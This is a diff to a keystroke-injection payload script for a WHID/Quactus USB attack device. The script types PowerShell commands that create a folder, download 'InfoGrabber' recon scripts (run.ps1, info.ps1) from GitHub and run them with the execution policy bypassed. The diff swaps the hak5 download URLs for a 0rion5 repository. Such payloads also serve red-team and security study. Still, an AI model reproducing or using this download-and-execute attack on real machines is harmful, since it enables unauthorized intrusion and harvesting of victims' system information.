@@ -17,10 +17,10 @@ Rem:*****************
 Print:New-Item -ItemType directory -Path C:\quactus\; cd C:\quactus\; cls
 Press:176
 CustomDelay:150
-Print:$source = "https://raw.githubusercontent.com/hak5/bashbunny-payloads/master/payloads/library/recon/InfoGrabber/run.ps1"; $destination = "C:\quactus\run.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
+Print:$source = "https://raw.githubusercontent.com/0rion5/WHID-Quactus-Payloads/master/library/Quactus/recon/InfoGrabber/run.ps1"; $destination = "C:\quactus\run.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
 Press:176
 CustomDelay:100
-Print:$source = "https://raw.githubusercontent.com/hak5/bashbunny-payloads/master/payloads/library/recon/InfoGrabber/info.ps1"; $destination = "C:\quactus\info.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
+Print:$source = "https://raw.githubusercontent.com/0rion5/WHID-Quactus-Payloads/master/library/Quactus/recon/InfoGrabber/info.ps1"; $destination = "C:\quactus\info.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
 Press:176
 CustomDelay:100
 Print:PowerShell.exe -ExecutionPolicy Bypass -File run.ps1; cls
